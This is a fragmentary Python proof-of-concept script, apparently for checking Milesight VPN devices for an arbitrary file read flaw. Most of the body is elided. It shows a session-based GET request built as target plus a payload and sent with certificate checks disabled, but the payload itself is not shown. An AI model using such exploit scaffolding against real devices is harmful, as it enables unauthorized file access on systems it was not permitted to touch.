...
def poc(target):
    try:
        ...
        if res1.status_code == 200:
            ...
            request =  requests.Request('GET',target+payload,headers=headers)
            pre_request = session.prepare_request(request)
            pre_request.url=target+payload
            res2 = session.send(pre_request,verify=False)
...
def main():
    parser = argparse.ArgumentParser("Milesight VPN任意文件读取漏洞检测POC")
